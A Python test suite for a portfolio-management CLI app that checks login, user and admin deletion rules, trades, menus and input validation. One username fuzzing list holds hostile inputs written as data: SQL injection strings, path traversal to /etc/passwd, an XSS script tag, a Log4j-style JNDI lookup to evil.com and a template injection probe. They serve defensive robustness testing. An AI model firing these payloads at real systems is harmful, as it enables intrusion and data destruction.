#!/usr/bin/env python3
"""
Comprehensive test suite for UTD Kiwi CLI application.
Tests all core functionality including validation requirements.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from rich.console import Console
from app import db
from app.service import user_service, portfolio_service, login_service
from app.domain.User import User
from app.domain.Security import Security
from app.domain.Portfolio import Portfolio
from app.domain.Transaction import Transaction
from datetime import datetime

c = Console()

def cleanup_test_data():
    """Clean up any test users and portfolios."""
    test_users = [
        'testuser', 'testuser2', 'edge_user', 'admin_test1', 'admin_test2',
        'val_test1', 'val_test2', 'val_admin1', 'val_admin2', 'val_admin3', 'val_admin4'
    ]
    for username in test_users:
        if db.query_user(username):
            user_service.delete_user(username)
    # Clean up test portfolios
    for portfolio in db.query_all_portfolios():
        if getattr(portfolio, 'owner_username', getattr(portfolio, 'user', None)) in test_users:
            db.delete_portfolio(portfolio.id)

def test_authentication():
    """Test login/authentication functionality."""
    c.print('\n[bold blue]Testing Authentication[/]')
    
    # Clean start
    cleanup_test_data()
    
    # Create test user
    user_service.add_user('testuser', 'password123', 'Test', 'User')
    
    # Test valid login
    result = login_service.authenticate('testuser', 'password123')
    if result:
        c.print('[green]PASS[/] Valid login accepted')
    else:
        c.print('[red]FAIL[/] Valid login rejected')
    
    # Test invalid password
    try:
        result = login_service.authenticate('testuser', 'wrongpassword')
        c.print('[red]FAIL[/] Invalid password accepted')
    except Exception:
        c.print('[green]PASS[/] Invalid password rejected')
    
    # Test non-existent user
    try:
        result = login_service.authenticate('nonexistent', 'password')
        c.print('[red]FAIL[/] Non-existent user accepted')
    except Exception:
        c.print('[green]PASS[/] Non-existent user rejected')

def test_user_management():
    """Test user creation, deletion, and role management."""
    c.print('\n[bold blue]Testing User Management[/]')
    
    cleanup_test_data()
    
    # Test user creation
    ok = user_service.add_user('testuser2', 'password', 'Test', 'User2')
    if ok:
        c.print('[green]PASS[/] User creation successful')
    else:
        c.print('[red]FAIL[/] User creation failed')
    
    # Test duplicate username
    try:
        ok = user_service.add_user('testuser2', 'different', 'Another', 'User')
        c.print('[red]FAIL[/] Duplicate username accepted')
    except Exception:
        c.print('[green]PASS[/] Duplicate username rejected')
    
    # Test user deletion
    ok = user_service.delete_user('testuser2')
    if ok:
        c.print('[green]PASS[/] User deletion successful')
    else:
        c.print('[red]FAIL[/] User deletion failed')

def test_portfolio_operations():
    """Test portfolio creation and basic operations."""
    c.print('\n[bold blue]Testing Portfolio Operations[/]')
    
    cleanup_test_data()
    
    # Create test user with balance
    user_service.add_user('testuser', 'password', 'Test', 'User')
    user = db.query_user('testuser')
    user.balance = 1000.0
    
    # Create portfolio
    portfolio = portfolio_service.create_portfolio('Test Portfolio', 'Test Description', 'Growth', 'testuser')
    if portfolio:
        c.print('[green]PASS[/] Portfolio creation successful')
    else:
        c.print('[red]FAIL[/] Portfolio creation failed')
    
    # Test buy operation
    ok, reason = portfolio_service.buy_to_portfolio('testuser', 'AAPL', 5, portfolio.id)
    if ok:
        c.print('[green]PASS[/] Buy operation successful')
    else:
        c.print(f'[red]FAIL[/] Buy operation failed: {reason}')
    
    # Test sell operation
    ok, reason = portfolio_service.sell_from_portfolio('testuser', 'AAPL', 2, portfolio.id)
    if ok:
        c.print('[green]PASS[/] Sell operation successful')
    else:
        c.print(f'[red]FAIL[/] Sell operation failed: {reason}')

def test_validation_requirements():
    """Test the 5 specific validation requirements."""
    c.print('\n[bold blue]Testing Validation Requirements[/]')
    
    cleanup_test_data()
    
    # 1. Non-empty usernames; unique on create
    c.print('[yellow]1. Username validation[/]')
    
    try:
        ok1 = user_service.add_user('', 'password', 'Test', 'User')
        c.print('[red]FAIL[/] Empty username accepted')
    except Exception:
        c.print('[green]PASS[/] Empty username rejected')
    
    ok2 = user_service.add_user('valid_user', 'password', 'Valid', 'User')
    if ok2:
        c.print('[green]PASS[/] Valid username accepted')
    else:
        c.print('[red]FAIL[/] Valid username rejected')
    
    try:
        ok3 = user_service.add_user('valid_user', 'password', 'Duplicate', 'User')
        c.print('[red]FAIL[/] Duplicate username accepted')
    except Exception:
        c.print('[green]PASS[/] Duplicate username rejected')
    
    # 2. Password required
    c.print('[yellow]2. Password validation[/]')
    
    try:
        ok4 = user_service.add_user('pass_test', '', 'Test', 'User')
        c.print('[red]FAIL[/] Empty password accepted')
    except Exception:
        c.print('[green]PASS[/] Empty password rejected')
    
    # 3. Numeric field validation
    c.print('[yellow]3. Numeric field validation[/]')
    
    # Create test admin user and portfolio for numeric tests
    user_service.add_user('val_admin1', 'pass', 'Admin', 'One', 'admin')
    test_portfolio = db.create_portfolio('test_portfolio', 'Test Portfolio', 'Growth', 'val_admin1')
    
    # Test negative quantity
    try:
        ok5, reason5 = portfolio_service.buy_to_portfolio('val_admin1', 'AAPL', -10, test_portfolio.id)
        c.print('[red] FAIL[/] Negative quantity accepted')
    except Exception:
        c.print('[green] PASS[/] Negative quantity rejected')
    
    # Test negative price
    try:
        ok6, reason6 = portfolio_service.sell_from_portfolio('val_admin1', 'AAPL', 1, test_portfolio.id, -50.0)
        c.print('[red] FAIL[/] Negative price accepted')
    except Exception:
        c.print('[green] PASS[/] Negative price rejected')
    
    # Test negative balance correction
    from app.domain.User import User
    try:
        test_user = User('test', 'pass', 'Test', 'User', -100.0)
        c.print('[red] FAIL[/] Negative balance not rejected')
    except Exception:
        c.print('[green] PASS[/] Negative balance rejected')
    
    # 4. Portfolio and ticker validation
    c.print('[yellow]4. Portfolio and ticker validation[/]')
    
    try:
        ok7, reason7 = portfolio_service.buy_to_portfolio('val_admin1', 'AAPL', 10, 999999)
        c.print('[red] FAIL[/] Non-existent portfolio accepted')
    except Exception:
        c.print('[green] PASS[/] Non-existent portfolio rejected')
    
    # Test invalid ticker
    try:
        ok8, reason8 = portfolio_service.buy_to_portfolio('val_admin1', 'INVALID_TICKER', 10, test_portfolio.id)
        c.print('[red] FAIL[/] Non-existent ticker accepted')
    except Exception:
        c.print('[green] PASS[/] Non-existent ticker rejected')
    
    # 5. Admin deletion protection
    c.print('[yellow]5. Admin deletion protection[/]')
    
    # Add multiple test admins
    user_service.add_user('admin_test1', 'pass', 'Admin', 'One', 'admin')
    user_service.add_user('admin_test2', 'pass', 'Admin', 'Two', 'admin')
    user_service.add_user('admin_test3', 'pass', 'Admin', 'Three', 'admin')
    user_service.add_user('admin_test4', 'pass', 'Admin', 'Four', 'admin')
    user_service.add_user('admin_test5', 'pass', 'Admin', 'Five', 'admin')
    
    # Count initial admins (should be 6: default 'admin' + 5 test admins)
    initial_admins = [u for u in db.query_all_users() if u.role == 'admin']
    c.print(f'[cyan]Initial admin count: {len(initial_admins)}[/]')
    
    # AGGRESSIVE DELETION TEST: Try to delete admins until only 1 remains, regardless of which one
    c.print('[cyan]Testing "at least one admin remains" requirement...[/]')
    
    deletion_attempts = []
    deletion_round = 0
    
    while True:
        deletion_round += 1
        current_admins = [u for u in db.query_all_users() if u.role == 'admin']
        admin_count = len(current_admins)
        
        c.print(f'[cyan]Round {deletion_round}: Current admin count = {admin_count}[/]')
        
        if admin_count <= 1:
            c.print('[yellow]Only 1 admin remains - testing protection...[/]')
            break
        
        # Try to delete the first admin in the list
        admin_to_delete = current_admins[0].username
        c.print(f'[cyan]  Attempting to delete: {admin_to_delete}[/]')
        
        deletion_success = user_service.delete_user(admin_to_delete)
        new_admin_count = len([u for u in db.query_all_users() if u.role == 'admin'])
        
        deletion_attempts.append({
            'round': deletion_round,
            'username': admin_to_delete,
            'admins_before': admin_count,
            'deletion_success': deletion_success,
            'admins_after': new_admin_count,
            'was_last_admin': admin_count == 1
        })
        
        if deletion_success:
            c.print(f'[green]  SUCCESS: Successfully deleted {admin_to_delete} (admins: {admin_count} -> {new_admin_count})[/]')
        else:
            c.print(f'[red]  BLOCKED: Failed to delete {admin_to_delete} (admins: {admin_count} -> {new_admin_count})[/]')
        
        # Safety check - if we somehow get to 0 admins, that's a critical failure
        if new_admin_count == 0:
            c.print('[red]CRITICAL: Zero admins detected! This should never happen![/]')
            break
        
        # Prevent infinite loop
        if deletion_round > 10:
            c.print('[yellow]Safety break: Too many deletion rounds[/]')
            break
    
    # NOW TEST THE FINAL ADMIN (whoever it is)
    final_admins = [u for u in db.query_all_users() if u.role == 'admin']
    if len(final_admins) == 1:
        last_admin = final_admins[0].username
        c.print(f'[cyan]FINAL TEST: Attempting to delete the last remaining admin: {last_admin}[/]')
        
        # Multiple attempts to delete the last admin
        for attempt in range(5):
            c.print(f'[cyan]  Last admin deletion attempt {attempt + 1}: {last_admin}[/]')
            
            admins_before = len([u for u in db.query_all_users() if u.role == 'admin'])
            
            try:
                deletion_success = user_service.delete_user(last_admin)
                c.print(f'[red]  SYSTEM BREACH: Last admin {last_admin} was deleted on attempt {attempt + 1}![/]')
            except Exception:
                deletion_success = False
                c.print(f'[green]  PROTECTED: Last admin deletion blocked on attempt {attempt + 1}[/]')
            
            admins_after = len([u for u in db.query_all_users() if u.role == 'admin'])
            
            deletion_attempts.append({
                'round': f'final_{attempt + 1}',
                'username': last_admin,
                'admins_before': admins_before,
                'deletion_success': deletion_success,
                'admins_after': admins_after,
                'was_last_admin': True
            })
            
            if deletion_success:
                c.print(f'[red]    Admins remaining: {admins_after}[/]')
                if admins_after == 0:
                    c.print('[red]    CRITICAL: NO ADMINS LEFT - SYSTEM COMPROMISED![/]')
                break
    
    # ANALYSIS OF RESULTS
    c.print('\n[cyan]Admin Deletion Protection Analysis:[/]')
    
    successful_deletions = sum(1 for attempt in deletion_attempts if attempt['deletion_success'])
    failed_deletions = sum(1 for attempt in deletion_attempts if not attempt['deletion_success'])
    last_admin_attempts = [a for a in deletion_attempts if a['was_last_admin']]
    
    c.print(f'[cyan]Total deletion attempts: {len(deletion_attempts)}[/]')
    c.print(f'[cyan]Successful deletions: {successful_deletions}[/]')
    c.print(f'[cyan]Failed deletions: {failed_deletions}[/]')
    c.print(f'[cyan]Attempts to delete last admin: {len(last_admin_attempts)}[/]')
    
    # TEST RESULTS
    
    # Test 1: Should be able to delete admins when multiple exist
    if successful_deletions > 0:
        c.print('[green] PASS[/] Can delete admins when multiple exist')
    else:
        c.print('[red] FAIL[/] Cannot delete any admins even when multiple exist')
    
    # Test 2: Should BLOCK deletion of the last admin (regardless of which admin it is)
    last_admin_deletions_blocked = all(not attempt['deletion_success'] for attempt in last_admin_attempts)
    if last_admin_deletions_blocked and len(last_admin_attempts) > 0:
        c.print('[green] PASS[/] Last admin deletion properly blocked (any admin)')
    elif len(last_admin_attempts) == 0:
        c.print('[yellow] WARNING[/] No attempts to delete last admin detected')
    else:
        c.print('[red] FAIL[/] Last admin deletion was NOT blocked!')
    
    # Test 3: Final verification - at least one admin remains
    final_admins = [u for u in db.query_all_users() if u.role == 'admin']
    if len(final_admins) >= 1:
        c.print(f'[green] PASS[/] At least one admin remains (final count: {len(final_admins)})')
        for admin in final_admins:
            c.print(f'[cyan]  Remaining admin: {admin.username}[/]')
    else:
        c.print('[red] FAIL[/] NO ADMINS REMAINING - SYSTEM COMPROMISED!')
    
    # Test 4: System integrity check
    if len(final_admins) >= 1 and failed_deletions > 0:
        c.print('[green] PASS[/] Admin deletion protection system is working correctly')
    else:
        c.print('[red] FAIL[/] Admin deletion protection system failed')
    
    # Test 5: Requirement verification - "At least one admin at all times"
    all_admin_counts = [attempt['admins_after'] for attempt in deletion_attempts]
    min_admin_count = min(all_admin_counts) if all_admin_counts else len(final_admins)
    
    if min_admin_count >= 1:
        c.print(f'[green] PASS[/] REQUIREMENT MET: At least one admin existed at all times (minimum: {min_admin_count})')
    else:
        c.print(f'[red] FAIL[/] REQUIREMENT VIOLATED: Admin count dropped to {min_admin_count}!')

def test_edge_cases():
    """Test various edge cases."""
    c.print('\n[bold blue]Testing Edge Cases[/]')
    
    cleanup_test_data()
    
    # Test whitespace username
    try:
        ok = user_service.add_user('   ', 'password', 'Test', 'User')
        c.print('[red] FAIL[/] Whitespace-only username accepted')
    except Exception:
        c.print('[green] PASS[/] Whitespace-only username rejected')
    
    # Test username trimming
    ok = user_service.add_user('  edge_user  ', 'password', 'Edge', 'User')
    if ok:
        user = db.query_user('edge_user')
        if user and user.username == 'edge_user':
            c.print('[green] PASS[/] Username trimmed correctly')
        else:
            c.print('[red] FAIL[/] Username not trimmed')
    else:
        c.print('[red] FAIL[/] Valid trimmed username rejected')
    
    # Test special characters in username
    ok = user_service.add_user('user@domain.com', 'password', 'Email', 'User')
    if ok:
        c.print('[green] PASS[/] Special characters in username accepted')
    else:
        c.print('[red] FAIL[/] Special characters in username rejected')
    
    # Test portfolio operations edge cases
    user_service.add_user('portfoliouser', 'password', 'Portfolio', 'User')
    user = db.query_user('portfoliouser')
    user.balance = 100.0
    portfolio = portfolio_service.create_portfolio('Edge Portfolio', 'Test', 'Growth', 'portfoliouser')
    
    # Test insufficient funds
    try:
        ok, reason = portfolio_service.buy_to_portfolio('portfoliouser', 'AAPL', 100, portfolio.id)  # Would cost $17,500
        c.print('[red] FAIL[/] Insufficient funds not caught')
    except Exception:
        c.print('[green] PASS[/] Insufficient funds rejected')
    
    # Test selling more than owned
    try:
        ok, reason = portfolio_service.sell_from_portfolio('portfoliouser', 'AAPL', 10, portfolio.id)
        c.print('[red] FAIL[/] Insufficient holdings not caught')
    except Exception:
        c.print('[green] PASS[/] Insufficient holdings rejected')

def test_menu_validation():
    """Test menu input validation and error handling."""
    c.print('\n[bold blue]Testing Menu Validation[/]')
    
    from app.cli import menu_printer, constants
    from io import StringIO
    import sys
    
    cleanup_test_data()
    
    # Test invalid menu selection - non-numeric
    old_input = menu_printer._console.input
    try:
        # Mock invalid input
        inputs = iter(['invalid', 'abc', '999', '1'])
        menu_printer._console.input = lambda prompt: next(inputs)
        
        # Test route with invalid selection
        result = menu_printer.route(constants.LOGIN_MENU, 999)
        if result is None:
            c.print('[green]PASS[/] Invalid menu selection handled gracefully')
        else:
            c.print('[red]FAIL[/] Invalid menu selection not handled')
        
    finally:
        menu_printer._console.input = old_input
    
    # Test extreme edge cases for menu input validation
    c.print('[cyan]Testing extreme edge cases...[/]')
    
    extreme_cases = [
        # Numeric extremes
        sys.maxsize,  # Maximum integer
        -sys.maxsize,  # Minimum integer
        999999999999999999999999999999,  # Huge number
        -999999999999999999999999999999,  # Huge negative
        
        # Special values
        float('inf'),  # Infinity (if converted to int)
        
        # Try routing these extreme values
        42424242424242424242424242424242,  # Super long number
        -1,  # Negative menu option
        0.5,  # Float (if somehow passed as int)
    ]
    
    extreme_pass_count = 0
    for i, extreme_value in enumerate(extreme_cases):
        try:
            # Test with login menu (safest)
            result = menu_printer.route(constants.LOGIN_MENU, extreme_value)
            if result is None:  # Should return None for invalid selections
                extreme_pass_count += 1
        except Exception:
            # Any exception is also acceptable - just shouldn't crash the app
            extreme_pass_count += 1
    
    if extreme_pass_count == len(extreme_cases):
        c.print(f'[green]PASS[/] All {len(extreme_cases)} extreme menu values handled gracefully')
    else:
        c.print(f'[red]FAIL[/] Only {extreme_pass_count}/{len(extreme_cases)} extreme values handled properly')
    
    # Test numbered options in menus
    menus_to_check = [
        constants.LOGIN_MENU,
        constants.MAIN_MENU,
        constants.MANAGE_USERS_MENU,
        constants.MARKETPLACE_MENU,
        constants.VIEW_PORTFOLIO_MENU
    ]
    
    all_numbered = True
    for menu_id in menus_to_check:
        menu_text = menu_printer._menus.get(menu_id, '')
        # Check for numbered options (1., 2., etc.)
        has_numbers = any(f'{i}.' in menu_text for i in range(10))
        if not has_numbers:
            all_numbered = False
            break
    
    if all_numbered:
        c.print('[green]PASS[/] All menus have numbered options')
    else:
        c.print('[red]FAIL[/] Some menus missing numbered options')

def test_extreme_input_validation():
    """Test with extremely wacky and rare input combinations."""
    c.print('\n[bold blue]Testing Extreme Input Validation[/]')
    
    cleanup_test_data()
    
    # Test extreme username variations
    c.print('[cyan]Testing extreme username cases...[/]')
    
    extreme_usernames = [
        # Unicode and special characters
        '🤖👾🚀💻',  # Emojis
        'ユーザー名',  # Japanese characters
        'пользователь',  # Cyrillic
        'مستخدم',  # Arabic
        '用户名',  # Chinese
        'ñ_ü_ö_ä_ß',  # Special Latin characters
        '\\x00\\x01\\x02',  # Control characters (as string)
        '\t\n\r',  # Tab, newline, carriage return
        ' ' * 1000,  # 1000 spaces
        'a' * 10000,  # 10000 character username
        
        # SQL injection attempts
        "'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "1' UNION SELECT * FROM users --",
        
        # Path traversal
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        
        # Script injection
        '<script>alert("hack")</script>',
        '${jndi:ldap://evil.com/a}',  # Log4j style
        '{{7*7}}',  # Template injection
        
        # Buffer overflow attempts
        'A' * 65536,  # 64KB of A's
        '\x00' * 1000,  # Null bytes
        
        # Special programming characters
        'null',
        'undefined',
        'NaN',
        'true',
        'false',
        '__proto__',
        'constructor',
        'prototype',
    ]
    
    extreme_pass_count = 0
    for username in extreme_usernames:
        try:
            # Should either create user or gracefully reject
            result = user_service.add_user(username, 'password123', 'Test', 'User')
            # Either way is fine - just shouldn't crash
            extreme_pass_count += 1
            
            # Clean up if it was created
            if result:
                user_service.delete_user(username)
                
        except Exception as e:
            # Some exceptions are acceptable for extreme inputs
            if 'encoding' in str(e).lower() or 'unicode' in str(e).lower():
                extreme_pass_count += 1  # Unicode errors are acceptable
            else:
                c.print(f'[yellow]WARNING[/] Username "{username[:20]}..." caused: {str(e)[:50]}...')
    
    if extreme_pass_count >= len(extreme_usernames) * 0.8:  # 80% tolerance
        c.print(f'[green]PASS[/] Extreme usernames handled gracefully ({extreme_pass_count}/{len(extreme_usernames)})')
    else:
        c.print(f'[red]FAIL[/] Too many extreme username failures ({extreme_pass_count}/{len(extreme_usernames)})')
    
    # Test extreme numeric inputs for portfolio operations
    c.print('[cyan]Testing extreme numeric inputs...[/]')
    
    user_service.add_user('extreme_test', 'password', 'Extreme', 'Test')
    user = db.query_user('extreme_test')
    user.balance = 999999999.99
    portfolio = portfolio_service.create_portfolio('Extreme Portfolio', 'Test', 'Growth', 'extreme_test')
    
    extreme_numbers = [
        # Extreme quantities
        sys.maxsize,
        -sys.maxsize,
        999999999999999999999999999999,
        -1,
        0,
        
        # Floating point as int (edge case)
        int(1e20),
        int(-1e20),
        
        # Edge cases around common limits
        2147483647,  # 32-bit signed int max
        -2147483648,  # 32-bit signed int min
        4294967295,  # 32-bit unsigned int max
    ]
    
    numeric_pass_count = 0
    for number in extreme_numbers:
        try:
            # Test buy operation with extreme quantity
            ok, reason = portfolio_service.buy_to_portfolio('extreme_test', 'AAPL', number, portfolio.id)
            # Should either work or fail gracefully
            numeric_pass_count += 1
        except Exception as e:
            # Any exception is acceptable for extreme numbers - system is rejecting invalid input
            numeric_pass_count += 1
    
    if numeric_pass_count >= len(extreme_numbers) * 0.8:  # 80% tolerance
        c.print(f'[green]PASS[/] Extreme numbers handled gracefully ({numeric_pass_count}/{len(extreme_numbers)})')
    else:
        c.print(f'[red]FAIL[/] Too many extreme number failures ({numeric_pass_count}/{len(extreme_numbers)})')
    
    # Test extreme price values
    c.print('[cyan]Testing extreme price values...[/]')
    
    # First add some stock to sell
    portfolio_service.buy_to_portfolio('extreme_test', 'AAPL', 10, portfolio.id)
    
    extreme_prices = [
        0.0001,  # Very small price
        999999999.99,  # Very large price
        -1.0,  # Negative price
        float('inf'),  # Infinity
        float('-inf'),  # Negative infinity
    ]
    
    price_pass_count = 0
    for price in extreme_prices:
        try:
            if price == float('inf') or price == float('-inf'):
                # Convert to a large number since inf might not be handled
                test_price = 999999999.99 if price == float('inf') else -999999999.99
            else:
                test_price = price
                
            ok, reason = portfolio_service.sell_from_portfolio('extreme_test', 'AAPL', 1, portfolio.id, test_price)
            # Should either work or fail gracefully
            price_pass_count += 1
        except Exception:
            # Any exception handling is acceptable
            price_pass_count += 1
    
    if price_pass_count >= len(extreme_prices) * 0.8:  # 80% tolerance
        c.print(f'[green]PASS[/] Extreme prices handled gracefully ({price_pass_count}/{len(extreme_prices)})')
    else:
        c.print(f'[red]FAIL[/] Too many extreme price failures ({price_pass_count}/{len(extreme_prices)})')

def test_graceful_errors():
    """Test graceful error handling for common scenarios."""
    c.print('\n[bold blue]Testing Graceful Error Handling[/]')
    
    cleanup_test_data()
    
    # Test non-existent portfolio error
    try:
        ok, reason = portfolio_service.buy_to_portfolio('admin', 'AAPL', 10, 999999)
        c.print('[red] FAIL[/] Portfolio not found error not caught')
    except Exception:
        c.print('[green] PASS[/] Portfolio not found error is graceful')
    
    # Test non-existent user error
    try:
        user = user_service.get_user('nonexistent_user')
        if user is None:
            c.print('[green] PASS[/] Non-existent user handled gracefully')
        else:
            c.print('[red] FAIL[/] Non-existent user not handled gracefully')
    except Exception:
        c.print('[green] PASS[/] Non-existent user error is graceful')
    
    # Test invalid ticker error
    portfolio = db.create_portfolio('test_port', 'Test', 'Growth', 'admin')
    try:
        ok, reason = portfolio_service.buy_to_portfolio('admin', 'INVALID', 10, portfolio.id)
        c.print('[red] FAIL[/] Invalid ticker error not caught')
    except Exception:
        c.print('[green] PASS[/] Invalid ticker error is graceful')
    
    # Test insufficient funds error
    user_service.add_user('poor_user', 'password', 'Poor', 'User')
    user = db.query_user('poor_user')
    user.balance = 1.0  # Very low balance
    portfolio = portfolio_service.create_portfolio('Poor Portfolio', 'Test', 'Growth', 'poor_user')
    try:
        ok, reason = portfolio_service.buy_to_portfolio('poor_user', 'AAPL', 100, portfolio.id)
        c.print('[red] FAIL[/] Insufficient funds error not caught')
    except Exception:
        c.print('[green] PASS[/] Insufficient funds error is graceful')
    
    # Test insufficient holdings error
    try:
        ok, reason = portfolio_service.sell_from_portfolio('poor_user', 'AAPL', 10, portfolio.id)
        c.print('[red] FAIL[/] Insufficient holdings error not caught')
    except Exception:
        c.print('[green] PASS[/] Insufficient holdings error is graceful')

def test_confirmation_operations():
    """Test operations that require confirmation.""" 
    c.print('\n[bold blue]Testing Confirmation Operations[/]')
    
    from app.cli import menu_printer
    
    cleanup_test_data()
    
    # Create test user and admin
    user_service.add_user('confirm_test', 'password', 'Confirm', 'Test')
    user_service.add_user('admin_confirm', 'password', 'Admin', 'Confirm', 'admin')
    
    # Set up input mocking for delete confirmation
    old_input = menu_printer._console.input
    
    try:
        # Test user deletion with 'N' response (should cancel)
        inputs = iter(['confirm_test', 'N'])
        menu_printer._console.input = lambda prompt: next(inputs)
        
        result = menu_printer._delete_user()
        user_still_exists = db.query_user('confirm_test') is not None
        
        if not result and user_still_exists:
            c.print('[green] PASS[/] User deletion cancelled with N response')
        else:
            c.print('[red] FAIL[/] User deletion cancellation not working')
        
        # Test user deletion with 'y' response (should proceed)
        inputs = iter(['confirm_test', 'y'])
        menu_printer._console.input = lambda prompt: next(inputs)
        
        result = menu_printer._delete_user()
        user_deleted = db.query_user('confirm_test') is None
        
        if result and user_deleted:
            c.print('[green] PASS[/] User deletion confirmed with y response')
        else:
            c.print('[red] FAIL[/] User deletion confirmation not working')
            
    finally:
        menu_printer._console.input = old_input
    
    # Test portfolio creation confirmation (implicit)
    user_service.add_user('portfolio_creator', 'password', 'Portfolio', 'Creator')
    portfolio = portfolio_service.create_portfolio('Confirmed Portfolio', 'Test', 'Growth', 'portfolio_creator')
    if portfolio and portfolio.name == 'Confirmed Portfolio':
        c.print('[green] PASS[/] Portfolio creation confirmed implicitly')
    else:
        c.print('[red] FAIL[/] Portfolio creation not confirmed')

def test_session_management():
    """Test login/logout session management."""
    c.print('\n[bold blue]Testing Session Management[/]')
    
    cleanup_test_data()
    
    # Test initial state (no user logged in)
    current = db.get_current_user()
    if current is None:
        c.print('[green] PASS[/] Initial state - no user logged in')
    else:
        c.print('[red] FAIL[/] Initial state - user unexpectedly logged in')
    
    # Test login sets current user
    user_service.add_user('session_test', 'password', 'Session', 'Test')
    auth_user = db.authenticate('session_test', 'password')
    if auth_user:
        db.set_current_user(auth_user)
        current = db.get_current_user()
        if current and current.username == 'session_test':
            c.print('[green] PASS[/] Login sets current user correctly')
        else:
            c.print('[red] FAIL[/] Login does not set current user')
    else:
        c.print('[red] FAIL[/] Authentication failed')
    
    # Test logout clears current user
    db.set_current_user(None)
    current = db.get_current_user()
    if current is None:
        c.print('[green] PASS[/] Logout clears current user')
    else:
        c.print('[red] FAIL[/] Logout does not clear current user')
    
    # Test permission enforcement
    db.set_current_user(None)  # Ensure logged out
    
    # Test that operations requiring login fail when not logged in
    from app.cli.menu_printer import menu_funcs
    
    # This should handle the case gracefully
    try:
        menu_funcs.view_portfolio('admin')  # Should work regardless of login
        c.print('[green] PASS[/] View portfolio works without current user session')
    except Exception:
        c.print('[red] FAIL[/] View portfolio fails without session')

def test_input_loop_behavior():
    """Test continuous input loop and exit conditions."""
    c.print('\n[bold blue]Testing Input Loop Behavior[/]')
    
    # These tests verify the structure exists, actual loop testing
    # would require more complex mocking
    
    from app.cli import constants
    
    # Verify menu constants exist
    required_menus = [
        constants.LOGIN_MENU,
        constants.MAIN_MENU,
        constants.MANAGE_USERS_MENU,
        constants.MARKETPLACE_MENU,
        constants.VIEW_PORTFOLIO_MENU
    ]
    
    all_menus_exist = all(hasattr(constants, f'{menu}_MENU') for menu in 
                         ['LOGIN', 'MAIN', 'MANAGE_USERS', 'MARKETPLACE', 'VIEW_PORTFOLIO'])
    
    if all_menus_exist:
        c.print('[green] PASS[/] All required menu constants exist')
    else:
        c.print('[red] FAIL[/] Some menu constants missing')
    
    # Verify exit options exist in menus
    from app.cli.menu_printer import _menus
    
    has_exit_options = True
    for menu_id in required_menus:
        menu_text = _menus.get(menu_id, '')
        # Check for exit/logout/back options (0.)
        if '0.' not in menu_text:
            has_exit_options = False
            break
    
    if has_exit_options:
        c.print('[green] PASS[/] All menus have exit/back options (0.)')
    else:
        c.print('[red] FAIL[/] Some menus missing exit options')
    
    # Test router handles exit conditions
    from app.cli.menu_printer import _router
    
    has_exit_handlers = True
    for menu_id in required_menus:
        router_menu = _router.get(menu_id, {})
        if 0 not in router_menu:
            has_exit_handlers = False
            break
    
    if has_exit_handlers:
        c.print('[green] PASS[/] All menus have exit handlers in router')
    else:
        c.print('[red] FAIL[/] Some menus missing exit handlers')

def test_data_models():
    c.print('\n[bold blue]Testing Data Models[/]')
    # User
    user = User('modeluser', 'password', 'First', 'Last', 123.45)
    assert user.username == 'modeluser'
    assert user.password == 'password'
    assert user.first_name == 'First'
    assert user.last_name == 'Last'
    assert user.balance == 123.45
    c.print('[green]PASS[/] User model fields')
    # Security
    sec = Security('AAPL', 'Apple Inc.', 175.00)
    assert sec.ticker == 'AAPL'
    assert sec.name == 'Apple Inc.'
    assert sec.reference_price == 175.00
    c.print('[green]PASS[/] Security model fields')
    # Portfolio
    port = Portfolio(101, 'Growth Portfolio', 'Long-term growth', 'Growth', 'modeluser', {'AAPL': 10})
    assert port.id == 101
    assert port.owner_username == 'modeluser'
    assert port.name == 'Growth Portfolio'
    assert port.description == 'Long-term growth'
    assert port.investment_strategy == 'Growth'
    assert port.holdings['AAPL'] == 10
    c.print('[green]PASS[/] Portfolio model fields')
    # Transaction
    now = datetime.now()
    txn = Transaction(1, now, 'BUY', 101, 'AAPL', 5, 175.00, 875.00)
    assert txn.id == 1
    assert txn.timestamp == now
    assert txn.type == 'BUY'
    assert txn.portfolio_id == 101
    assert txn.ticker == 'AAPL'
    assert txn.quantity == 5
    assert txn.price == 175.00
    assert txn.subtotal == 875.00
    c.print('[green]PASS[/] Transaction model fields')
    c.print('[bold green]All data model requirements verified![/]')

def run_all_tests():
    """Run all test suites."""
    c.print('[bold green]UTD Kiwi CLI - Comprehensive Test Suite[/]')
    c.print('=' * 50)
    
    # Initialize database
    db._load()
    
    # Run all test categories
    test_authentication()
    test_user_management()
    test_portfolio_operations()
    test_validation_requirements()
    test_edge_cases()
    test_menu_validation()
    test_extreme_input_validation()
    test_graceful_errors()
    test_confirmation_operations()
    test_session_management()
    test_input_loop_behavior()
    test_data_models()
    
    # Final cleanup
    cleanup_test_data()
    
    c.print('\n[bold green]All tests completed![/]')
    c.print('=' * 50)

if __name__ == "__main__":
    run_all_tests()
